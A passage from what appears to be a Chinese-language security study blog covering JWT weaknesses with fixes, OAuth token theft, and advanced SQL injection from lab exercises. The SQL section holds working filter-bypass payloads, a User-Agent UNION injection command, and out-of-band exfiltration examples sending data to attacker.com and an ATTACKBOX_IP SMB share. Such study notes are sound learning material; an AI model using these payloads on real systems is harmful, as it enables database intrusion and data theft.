class="headerlink" title="签名可被降级"></a>签名可被降级</h3><p><strong>核心漏洞：签名可被降级到 <code>None</code></strong></p><p>简单来说，这个漏洞允许攻击者：</p><ol><li><strong>修改 JWT 头部 (<code>header</code>) 中的 <code>alg</code> (algorithm) 字段为 <code>None</code>。</strong></li><li>将修改后的 JWT 发送给服务器。</li><li>如果服务器端的 JWT 验证库没有正确处理 <code>None</code> 算法（特别是当它<strong>没有显式地拒绝 <code>None</code> 算法</strong>或者<strong>没有指定一个允许的算法列表</strong>时），它可能会错误地<strong>跳过签名验证</strong>，并认为这个“未签名”的 JWT 是有效的。</li></ol><p><strong>开发者的错误：</strong> 问题在于开发者没有正确地实现验证逻辑：</p><ul><li><p><strong>没有锁定算法：</strong> 开发者可能没有强制要求只能使用特定的签名算法（例如 <code>HS256</code>）。</p></li><li><p><strong>没有拒绝 <code>None</code> 算法：</strong> 他们的代码可能没有明确地拒绝 <code>None</code> 算法，导致库在遇到 <code>None</code> 时，默认跳过签名验证。</p></li><li><p><strong>动态读取 <code>alg</code>：</strong> 文中提到的“开发者的错误”示例就是：</p><figure class="shiki Python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre><code>header = jwt.get_unverified_header(token) # 获取未验证的头部signature_algorithm = header['alg']       # 读取攻击者控制的 alg 字段payload = jwt.decode(token, self.secret, algorithms=signature_algorithm) # 用这个 alg 去解码</code></pre></div></div></figure><p>这种方式让攻击者通过控制 <code>alg</code> 字段，来控制服务器用来验证签名的算法。当攻击者将 <code>alg</code> 改为 <code>None</code> 时，<code>jwt.decode</code> 函数会接收到 <code>algorithms=None</code>，从而导致签名验证被绕过。</p></li></ul><h4 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a><strong>修复方案</strong></h4><p>修复方法很简单：<strong>在调用 JWT 解码函数时，显式地提供一个</strong>允许的签名算法<strong>列表</strong>。</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(token, </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.secret, </span><span style="color: #E06C75; font-style: italic">algorithms</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&quot;HS256&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;HS384&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;HS512&quot;</span><span style="color: #ABB2BF">])</span></span></code></pre></div></div></figure><ul><li>通过这种方式，即使攻击者将 JWT 头部中的 <code>alg</code> 字段改为 <code>None</code>，或者任何不在 <code>[&quot;HS256&quot;, &quot;HS384&quot;, &quot;HS512&quot;]</code> 列表中的算法，<code>jwt.decode</code> 函数也会抛出错误，拒绝该 JWT，因为它只接受明确指定的安全算法。</li><li>文中的 <code>Pyjwt</code> 库也对此进行了安全增强，当指定了 <code>secret</code> 但 <code>alg</code> 为 <code>None</code> 时会抛出异常，这是防止此类攻击的一种内置保护。</li></ul><hr><p>总而言之，这个例子完美展示了 <strong>“最小权限原则”</strong> 在代码层面的体现：<strong>只允许明确的安全算法</strong>，而不是盲目信任 JWT 头部中声明的算法。这是防止 JWT 伪造的关键防御措施之一。</p><h3 id="弱对称密钥"><a href="#弱对称密钥" class="headerlink" title="弱对称密钥"></a>弱对称密钥</h3><p>因为对称密钥的使用，所以 JWT 的安全性就依赖密钥的熵和长度了。因为对称密钥是可以恢复的，所以密钥一旦泄露，就导致数据的安全性得不到保障了。</p><h3 id="JWT-算法混淆攻击"><a href="#JWT-算法混淆攻击" class="headerlink" title="JWT 算法混淆攻击"></a>JWT 算法混淆攻击</h3><p>核心漏洞点：后端 JWT 验证库的实现错误，将非对称算法的<strong>公钥</strong>错误地用作对称算法（HS256）的<strong>密钥</strong>。</p><h4 id="攻击流程分解"><a href="#攻击流程分解" class="headerlink" title="攻击流程分解"></a><strong>攻击流程分解</strong></h4><ol><li><strong>原始服务器设置：</strong><ul><li>服务器最初使用 <strong>RS256（非对称）</strong> 算法来签名 JWT。这意味着服务器有一个私钥（用于签名）和一个公钥（用于验证）。<strong>这个公钥是公开的。</strong></li><li>服务器的验证逻辑可能允许多种算法，包括 RS256 和 HS256，并且错误地处理了密钥类型。</li></ul></li><li><strong>攻击者的操作：</strong><ul><li><strong>步骤 1：获取原始 JWT 和公钥。</strong><ul><li>攻击者通过认证获得一个合法的 JWT。</li><li><strong>攻击者也获得了服务器的公钥。</strong> （通常通过 API 或证书是公开可获取的）。</li></ul></li><li><strong>步骤 2：篡改 JWT 的头部。</strong><ul><li>攻击者将 JWT 头部中的 <code>alg</code> 字段从 <code>RS256</code> 修改为 **<code>HS256</code>**。</li><li>攻击者同时可以修改 <code>payload</code> 中的任何内容（比如将 <code>admin:0</code> 改为 <code>admin:1</code>）。</li></ul></li><li><strong>步骤 3：使用</strong>服务器的公钥<strong>作为 HS256 的“秘密密钥”来签名伪造的 JWT。</strong><ul><li>这是最关键的一步。由于攻击者知道了服务器的<strong>公钥</strong>，他们就使用这个公钥作为 HS256 的<strong>秘密密钥</strong>来对篡改后的 JWT 头部和载荷进行签名。</li><li>记住：HS256 签名算法的特点是，<strong>签名和验证都使用同一个密钥</strong>。</li></ul></li></ul></li><li><strong>服务器端的错误验证逻辑（漏洞所在）：</strong><ul><li>当服务器接收到这个被篡改的 JWT 时，它会读取 <code>alg</code> 字段，发现它是 <code>HS256</code>。</li><li>此时，<strong>有缺陷的 JWT 验证库</strong>会发生混淆：它本应该使用一个真正的 HS256 秘密密钥来验证签名。但是，由于它的实现缺陷，<strong>它错误地将原本用于验证 RS256 的公钥（这个公钥在服务器端是已知的）当作了 HS256 的“秘密密钥”</strong>。</li><li>服务器现在用这个“（伪装成）HS256 密钥的公钥”来验证 JWT 的签名。</li></ul></li><li><strong>攻击成功：</strong><ul><li>攻击者在步骤 3 中，就是用这个<strong>公钥</strong>作为“秘密密钥”来生成 HS256 签名的。</li><li>服务器现在用<strong>同一个公钥</strong>作为“秘密密钥”来验证签名。</li><li><strong>因为用于签名和验证的“密钥”是同一个（都是服务器的公钥），所以签名验证成功！</strong></li></ul></li></ol><p><strong>总结</strong></p><p>这种攻击的本质是<strong>签名算法混淆</strong>，利用了 JWT 验证库在处理不同算法类型时的<strong>逻辑缺陷</strong>，特别是当允许混用对称和非对称算法时。攻击者不需要破解私钥，也不需要知道真正的 HS256 秘密密钥，只需要利用服务器公开的公钥就能伪造签名。</p><h4 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h4><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">header </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">get_unverified_header</span><span style="color: #ABB2BF">(token)</span></span><span class="line"><span style="color: #ABB2BF">algorithm </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> header[</span><span style="color: #98C379">&#39;alg&#39;</span><span style="color: #ABB2BF">]</span></span><span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;RS&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> algorithm: </span><span style="color: #7F848E; font-style: italic"># 如果是RS算法，则明确用公钥验证</span></span><span class="line"><span style="color: #ABB2BF">    payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(token, </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.public_key, </span><span style="color: #E06C75; font-style: italic">algorithms</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&quot;RS256&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;RS384&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;RS512&quot;</span><span style="color: #ABB2BF">])</span></span><span class="line"><span style="color: #C678DD">elif</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HS&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> algorithm: </span><span style="color: #7F848E; font-style: italic"># 如果是HS算法，则明确用秘密密钥验证</span></span><span class="line"><span style="color: #ABB2BF">    payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(token, </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.secret, </span><span style="color: #E06C75; font-style: italic">algorithms</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&quot;HS256&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;HS384&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;HS512&quot;</span><span style="color: #ABB2BF">])</span></span></code></pre></div></div></figure><p>这个修复的关键在于：</p><ol><li><strong>根据 JWT 头部声明的 <code>alg</code> 字段，明确区分是使用 <code>public_key</code> 还是 <code>secret</code> 进行验证。</strong></li><li>同时，<code>algorithms</code> 参数还限制了<strong>只允许特定范围的算法</strong>，避免了 <code>None</code> 算法降级。</li></ol><h2 id="有效期"><a href="#有效期" class="headerlink" title="有效期"></a>有效期</h2><p><strong>如果 JWT 中没有设置 <code>exp</code> (expiration time) 声明，或者 <code>exp</code> 值设置得过大，那么这个 JWT 就可能是永久有效的，或者有效期过长。</strong></p><ol><li><strong><code>exp</code> (Expiration Time) 声明的重要性：</strong><ul><li>在验证 JWT 签名之前，一个重要的步骤是检查 JWT 的<strong>生命周期</strong>。这通常是通过读取 <code>payload</code> 中的 <code>exp</code>（过期时间）声明来完成的。</li><li>如果当前时间超过了 <code>exp</code> 指定的时间，那么 JWT 应该被认为是无效的。</li></ul></li><li><strong><code>exp</code> 值过大或缺失的问题：</strong><ul><li><strong><code>exp</code> 值设置太大：</strong> 即使设置了 <code>exp</code>，但如果过期时间被设置得非常遥远（比如几十年后），那么这个 JWT 实际上也接近于永久有效。</li><li><strong><code>exp</code> 值未设置：</strong> 如果 JWT 的 <code>payload</code> 中根本没有 <code>exp</code> 这个声明，那么大多数 JWT 库在默认情况下，只要签名验证通过，就会认为这个 token 是<strong>永久有效</strong>的，因为它没有一个明确的过期时间来拒绝它。</li><li><strong>后果：</strong> 这种“永久有效”或“超长有效期”的 JWT 存在巨大的安全风险。如果一个用户的 JWT 被泄露（例如，通过会话劫持、XSS 攻击、用户设备丢失等），攻击者就可以<strong>无限期地</strong>使用这个泄露的 JWT 来冒充合法用户，直到服务器端采取其他方式（如密钥轮换、IP 白名单等）来使其失效。</li></ul></li><li><strong>JWT 与传统 Cookie 的区别：</strong><ul><li><strong>Cookie：</strong> 传统的会话管理中，服务器可以在任何时候通过使服务器端的会话失效（例如，从数据库中删除会话记录）来“吊销”一个 Cookie。</li><li><strong>JWT：</strong> JWT 的设计理念是<strong>无状态 (stateless)</strong> 和 <strong>去中心化 (decentralized)<strong>。一旦 JWT 被签发并发送给客户端，服务器就不再存储其状态。这意味着，如果你想在 <code>exp</code> 时间之前使一个 JWT 失效，你就必须维护一个</strong>黑名单 (blocklist &#x2F; denylist)</strong> 来记录所有被吊销的 JWT。维护黑名单会增加服务器端的复杂性，并且在一定程度上打破了 JWT 无状态的优势。</li></ul></li><li><strong>选择正确的 <code>exp</code> 值：</strong><ul><li>因此，选择一个合适的 <code>exp</code> 值非常关键，它应该根据应用程序的敏感性和功能来确定。</li><li>例如，银行应用（高度敏感）的 JWT 可能只有几分钟的有效期，而邮件服务器（相对不那么敏感）的 JWT 可能有几个小时甚至几天的有效期。</li></ul></li><li><strong>刷新令牌 (Refresher Tokens)：</strong><ul><li>刷新令牌是一种常见的解决方案，用于解决 JWT 有效期短和用户体验之间的平衡问题。</li><li>它通常配合一个短期有效的 <code>access token</code>（用于每次请求）和一个长期有效的 <code>refresh token</code>（用于在 <code>access token</code> 过期后获取新的 <code>access token</code>）。</li><li><code>refresh token</code> 通常只在少数特定端点使用，并且可以被服务器端存储和吊销。</li></ul></li></ol><h4 id="开发错误与修复"><a href="#开发错误与修复" class="headerlink" title="开发错误与修复"></a>开发错误与修复</h4><ul><li><strong>错误：</strong> 没有在 JWT 的 <code>payload</code> 中包含 <code>exp</code> 声明，导致 token 永久有效。</li><li><strong>修复：</strong> 在签发 JWT 时，<strong>务必在 <code>payload</code> 中添加 <code>exp</code> 声明</strong>，并将其设置为一个合理的、有限的时间。大多数 JWT 库在解码时会自动检查这个 <code>exp</code> 声明。</li></ul><h2 id="跨服务中继攻击"><a href="#跨服务中继攻击" class="headerlink" title="跨服务中继攻击"></a>跨服务中继攻击</h2><p>简单来说是一个 API 的 JWT 可以在另外一个 API 上作用，原因是 JWT 没有验证 audience 字段</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(token, </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.secret, </span><span style="color: #E06C75; font-style: italic">audience</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&quot;appA&quot;</span><span style="color: #ABB2BF">], </span><span style="color: #E06C75; font-style: italic">algorithms</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;HS256&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><h1 id="OAuth-漏洞"><a href="#OAuth-漏洞" class="headerlink" title="OAuth 漏洞"></a>OAuth 漏洞</h1><p>OAuth 实际上是调用第三方&#x2F;第一方的认证接口，比如说 QQ 快捷登录，拿到用户的在第三方&#x2F;第一方的凭证，这样我们作为调用方就有用户的相关信息和凭据了，然后我们再拿着用户的凭据(token)去调用相关需要凭证才能调用的接口，这样就是一个 OAuth 过程了。</p><p>里面容易存在的漏洞我觉得主要还是在那个 token 本身。</p><h2 id="关键概念"><a href="#关键概念" class="headerlink" title="关键概念"></a>关键概念</h2><h3 id="Resource-Owner"><a href="#Resource-Owner" class="headerlink" title="Resource Owner"></a>Resource Owner</h3><p>字面意思，就相当于在软件开屏的时候，提示你是否授权给应用程序，这时你就是你的资源所有者。</p><h3 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h3><p>Client 在 OAuth 流程中，是指<strong>代表资源所有者（用户）向授权服务器请求访问受保护资源的应用程序</strong>。</p><h3 id="Authorization-Server"><a href="#Authorization-Server" class="headerlink" title="Authorization Server"></a>Authorization Server</h3><p>在成功认证之后，颁发 token 给 client，还有一点就是问你是否允许客户端访问你的数据。</p><h3 id="Resource-Server"><a href="#Resource-Server" class="headerlink" title="Resource Server"></a>Resource Server</h3><p>就相当于数据库了，这里的意思是托管着用户的受保护资源，要有有效的 token，才会返回数据。</p><h3 id="Authorization-Grant"><a href="#Authorization-Grant" class="headerlink" title="Authorization Grant"></a>Authorization Grant</h3><p>主要的同意类型有 <code>Authorization Code</code>, <code>Implicit</code>, <code>Resource Owner Password Credentials</code>, and <code>Client Credentials</code>.</p><h3 id="Access-Token"><a href="#Access-Token" class="headerlink" title="Access Token"></a>Access Token</h3><p>短效，通常使用范围受限。</p><h3 id="Refresh-Token"><a href="#Refresh-Token" class="headerlink" title="Refresh Token"></a>Refresh Token</h3><p>用来生成 access token 的，长效。</p><h3 id="Redirect-URI"><a href="#Redirect-URI" class="headerlink" title="Redirect URI"></a>Redirect URI</h3><p>是授权服务器在完成用户认证和授权后，将用户的浏览器重定向回去的“客户端应用的接收地址”。</p><p>对于 URI 应该会有强校验，不然就随便跳了。</p><h3 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h3><p>权限范围吧。</p><h3 id="State-Parameter"><a href="#State-Parameter" class="headerlink" title="State Parameter"></a>State Parameter</h3><p>在请求登录的时候，跳到 OAuth 时会发一个 state，服务器返回一个 state，客户端会比对这个 state 是否一样。</p><p>如果是 CSRF 请求的话，总得要跳过去得到用户授权，如果直接请求的话那拿不到，就相当于一次请求是带了个验证码。</p><h3 id="Token-Authorization-Endpoint"><a href="#Token-Authorization-Endpoint" class="headerlink" title="Token &amp; Authorization Endpoint"></a>Token &amp; Authorization Endpoint</h3><p>认证的两个 API 吧，一个负责用户认证，一个负责颁发 Token。</p><h2 id="Grant-Types"><a href="#Grant-Types" class="headerlink" title="Grant Types"></a>Grant Types</h2><p>有好多种，主要是熟悉一下那些数据流，看看图片就理解了。</p><h2 id="鉴别-OAuth-框架"><a href="#鉴别-OAuth-框架" class="headerlink" title="鉴别 OAuth 框架"></a>鉴别 OAuth 框架</h2><ul><li>看 HTTP 头和响应</li><li>看源码<ul><li>js 库</li></ul></li><li>看 URL<ul><li>有固定格式，特征</li></ul></li><li>看错误信息</li></ul><h2 id="偷-OAuth-Token"><a href="#偷-OAuth-Token" class="headerlink" title="偷 OAuth Token"></a>偷 OAuth Token</h2><h3 id="redirect-url-没有被保护"><a href="#redirect-url-没有被保护" class="headerlink" title="redirect_url 没有被保护"></a>redirect_url 没有被保护</h3><p>攻击者可以构造 OAuth 链接然后诱导用户点击，token 被发到伪造的 URL 去（因为跳转链接就是携带 token 过去的地方）</p><h3 id="缺-state"><a href="#缺-state" class="headerlink" title="缺 state"></a>缺 state</h3><p>攻击者构造一个属于自己账户的认证链接，诱导用户点击。本来正常的认证是要带一个 state 参数的（这个参数是存在用户本地的，攻击者拿不到），但是因为认证服务器的问题，不检验这个字段，导致 token 点击就送。</p><h3 id="隐式授权流"><a href="#隐式授权流" class="headerlink" title="隐式授权流"></a>隐式授权流</h3><p>token 会显示在 url 中，攻击者可以构造 XSS，去偷 token。</p><h1 id="MFA"><a href="#MFA" class="headerlink" title="MFA"></a>MFA</h1><p>主要就是请求带验证码，密码验证之后能绕过，OTP 爆破。</p><h1 id="Hammer"><a href="#Hammer" class="headerlink" title="Hammer"></a>Hammer</h1><p>这一关感觉比较难了…因为那个 session 有尝试有效期，刚开始在 burp 里面折腾更新 cookie 很久，后面发现那样执行的话还是有失效的可能。转而写 python 脚本，单线程在慢慢跑。</p><h1 id="Advanced-SQL-Injection"><a href="#Advanced-SQL-Injection" class="headerlink" title="Advanced SQL Injection"></a>Advanced SQL Injection</h1><p>讲了一些二次注入的技巧，靠二次查询触发 SQL 注入，也就是把 SQL 语句拼接在那个查询 SQL 语句的后面</p><h2 id="SQL-绕过技巧"><a href="#SQL-绕过技巧" class="headerlink" title="SQL 绕过技巧"></a>SQL 绕过技巧</h2><h3 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h3><ul><li>URL 编码<ul><li>‘ OR 1&#x3D;1– can be encoded as %27%20OR%201%3D1–</li></ul></li><li>八进制编码<ul><li>SELECT * FROM users WHERE name &#x3D; ‘admin’ can be encoded as SELECT * FROM users WHERE name &#x3D; 0x61646d696e</li></ul></li><li>Unicode 编码<ul><li>admin can be encoded as \u0061\u0064\u006d\u0069\u006e</li></ul></li></ul><p>可以用 || 替代 OR</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">Intro to PHP&#39; || 1=1 --+</span></span><span class="line"><span style="color: #abb2bf">Intro%20to%20PHP%27%20%7C%7C%201=1%20--+</span></span></code></pre></div></div></figure><p>这里其实利用的是两个字符串与操作，只要有一个为真这个结果永远为真。</p><p>在 URL 编码 中 %20 和 + 等价，都是表示空格。</p><h3 id="没有引号的-SQL-注入"><a href="#没有引号的-SQL-注入" class="headerlink" title="没有引号的 SQL 注入"></a>没有引号的 SQL 注入</h3><ul><li>使用数值<ul><li>找一些不需要引号的注入点，直接用 OR 1&#x3D;1</li></ul></li><li>使用 SQL 注释<ul><li>用 <code>--</code> 我不太明白实际的用法，感觉更多的是让他去报错，因为注释掉了后面的话，语句都没有闭合了，肯定报错。</li></ul></li><li>使用 CONCAT()<ul><li><code>CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)</code> constructs the string admin</li></ul></li></ul><h3 id="不允许空格"><a href="#不允许空格" class="headerlink" title="不允许空格"></a>不允许空格</h3><ul><li>注释代替空格<ul><li>use SQL comments (<code>/**/</code>) to replace spaces</li></ul></li><li>Tab 或者换行符<ul><li>using tab (\t) or newline (\n)</li></ul></li><li>替代字符<ul><li>such as <code>%09</code> (horizontal tab), <code>%0A </code>(line feed), <code>%0C </code>(form feed), <code>%0D</code> (carriage return), and <code>%A0</code> (non-breaking space)</li></ul></li></ul><p>题目中 OR 也被过滤了，用 CONCAT 没用，最后还是用的两个 |，空格用 %09 代替。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1%27%09||%091=1%09--%09</span></span></code></pre></div></div></figure><p>一些场景，可以给你绕过一些思路</p><table><thead><tr><th><strong>Scenario</strong></th><th><strong>Description</strong></th><th><strong>Example</strong></th></tr></thead><tbody><tr><td><strong>Keywords like SELECT are banned</strong></td><td>SQL keywords can often be bypassed by changing their case or adding inline comments to break them up</td><td>SElEcT * FrOm users or SE&#x2F;<strong>&#x2F;LECT * FROM&#x2F;</strong>&#x2F;users</td></tr><tr><td><strong>Spaces are banned</strong></td><td>Using alternative whitespace characters or comments to replace spaces can help bypass filters.</td><td>SELECT%0A*%0AFROM%0Ausers or SELECT&#x2F;<strong>&#x2F;*&#x2F;</strong>&#x2F;FROM&#x2F;**&#x2F;users</td></tr><tr><td><strong>Logical operators like AND, OR are banned</strong></td><td>Using alternative logical operators or concatenation to bypass keyword filters.</td><td>username &#x3D; ‘admin’ &amp;&amp; password &#x3D; ‘password’ or username &#x3D; ‘admin’&#x2F;<strong>&#x2F;||&#x2F;</strong>&#x2F;1&#x3D;1 –</td></tr><tr><td><strong>Common keywords like UNION, SELECT are banned</strong></td><td>Using equivalent representations such as hexadecimal or Unicode encoding to bypass filters.</td><td>SElEcT * FROM users WHERE username &#x3D; CHAR(0x61,0x64,0x6D,0x69,0x6E)</td></tr><tr><td><strong>Specific keywords like OR, AND, SELECT, UNION are banned</strong></td><td>Using obfuscation techniques to disguise SQL keywords by combining characters with string functions or comments.</td><td>SElECT * FROM users WHERE username &#x3D; CONCAT(‘a’,’d’,’m’,’i’,’n’) or SElEcT&#x2F;<strong>&#x2F;username&#x2F;</strong>&#x2F;FROM&#x2F;**&#x2F;users</td></tr></tbody></table><h2 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h2><h3 id="不同数据库的使用方法"><a href="#不同数据库的使用方法" class="headerlink" title="不同数据库的使用方法"></a>不同数据库的使用方法</h3><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><p>可以写文件出来，然后用其他方式去访问这个文件</p><figure class="shiki sql"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">SELECT</span><span style="color: #ABB2BF"> sensitive_data </span><span style="color: #C678DD">FROM</span><span style="color: #ABB2BF"> users </span><span style="color: #C678DD">INTO</span><span style="color: #ABB2BF"> OUTFILE </span><span style="color: #98C379">&#39;/tmp/out.txt&#39;</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h4><p>主要用的是 xp_cmdshell</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">EXEC xp_cmdshell &#39;bcp &quot;SELECT sensitive_data FROM users&quot; queryout &quot;\\10.10.58.187\logs\out.txt&quot; -c -T&#39;;</span></span></code></pre></div></div></figure><h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><figure class="shiki sql"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">DECLARE</span></span><span class="line"><span style="color: #ABB2BF">  req </span><span style="color: #D19A66">UTL_HTTP</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">REQ</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">  resp </span><span style="color: #D19A66">UTL_HTTP</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">RESP</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">BEGIN</span></span><span class="line"><span style="color: #ABB2BF">  req :</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">UTL_HTTP</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">BEGIN_REQUEST</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;http://attacker.com/exfiltrate?sensitive_data=&#39;</span><span style="color: #ABB2BF"> || sensitive_data);</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #D19A66">UTL_HTTP</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">GET_RESPONSE</span><span style="color: #ABB2BF">(req);</span></span><span class="line"><span style="color: #C678DD">END</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>在 mysql 中，如果 <code>secure_file_priv</code> 被设置的话，写入文件的目录就被限制住了</p><p>用这个命令开无密码共享</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># SMB 开本地共享</span></span><span class="line"><span style="color: #abb2bf">python github/impacket/examples/smbserver.py -smb2support -comment &quot;My Logs Server&quot; -debug logs /tmp</span></span></code></pre></div></div></figure><p>这是一个带外注入写 SMB 的实例。</p><figure class="shiki sql"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #D19A66">1</span><span style="color: #98C379">&#39;; SELECT @@version INTO OUTFILE &#39;</span><span style="color: #ABB2BF">\\\\ATTACKBOX_IP\\logs\\</span><span style="color: #D19A66">out</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">txt</span><span style="color: #98C379">&#39;; --</span></span></code></pre></div></div></figure><h2 id="其他技术"><a href="#其他技术" class="headerlink" title="其他技术"></a>其他技术</h2><h3 id="HTTP-头注入"><a href="#HTTP-头注入" class="headerlink" title="HTTP 头注入"></a>HTTP 头注入</h3><p>一些可能会把 HTTP 头的一些数据写进数据库，这就造成了注入点了。</p><p>比如 UA, Referer, X-Forward-For。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">curl -H &quot;User-Agent: &#39; UNION SELECT username, password FROM user; # &quot; http://10.10.115.31/httpagent/</span></span></code></pre></div></div></figure><figure class="shiki sql"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">&#39; UNION SELECT 1,database() ; # &quot;</span></span><span class="line"></span><span class="line"><span style="color: #98C379">result: library</span></span><span class="line"></span><span class="line"><span style="color: #98C379">&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">UNION</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">SELECT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,group_concat(table_name) </span><span style="color: #C678DD">FROM</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">information_schema</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">tables</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">WHERE</span><span style="color: #ABB2BF"> table_schema </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;library&#39;</span><span style="color: #ABB2BF"> ; #</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">result: books,logs,user,visitor</span></span><span class="line"></span><span class="line"><span style="color: #98C379">&#39; UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = &#39;</span><span style="color: #ABB2BF">books</span><span style="color: #98C379">&#39; ; #</span></span><span class="line"></span><span class="line"><span style="color: #98C379">result: 